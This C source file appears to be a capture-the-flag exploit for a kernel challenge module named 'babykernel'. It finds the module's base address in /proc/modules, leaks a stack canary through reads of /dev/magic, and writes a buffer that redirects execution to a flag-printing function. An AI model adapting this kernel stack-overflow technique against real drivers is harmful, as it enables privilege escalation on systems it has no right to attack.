/*
* A simple exploit for babykernel
* author: w0lfzhang
* date: 2018.12.21
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>

/*
* get magic module's address
*/
unsigned long get_magic_address()
{
	FILE *f;
	char name[10];
	int mem_size;
	int load_times;
	unsigned long magic_address;

	f = fopen("/proc/modules", "r");
	if (f == NULL){
		perror("open /proc/modules failed!");
	}

	memset(name, 0, 10);
	fscanf(f, "%s %d %d - Live %p", name, &mem_size, &load_times, (void **)&magic_address);
	printf("[+] module name: %s, base addr:%p\n", name, (void *)magic_address);

	return magic_address;
}

int main(int argc, char *argv[])
{
	int fd;
	char buf[100];
	unsigned long cat_flag_addr, canary;
	unsigned long magic_dev_read_ret;
	memset(buf, 0, 100);
	fd = open("/dev/magic", O_RDWR);
	if(fd < 0){
		perror("open /dev/magic failed!");
	}
	
	cat_flag_addr = get_magic_address() + 0x150;
	printf("[+] cat_flag addr: %p\n", (void *)cat_flag_addr);

	//first, you need to leak canary
	read(fd, buf, 0x38);
	canary = ((unsigned long *)buf)[6];
	printf("[+] canary: 0x%lx\n", canary);

	//for understanding
	((unsigned long *)buf)[0] = cat_flag_addr;
	((unsigned long *)buf)[6] = canary;
	write(fd, buf, 0x38);
	
	return 0;
}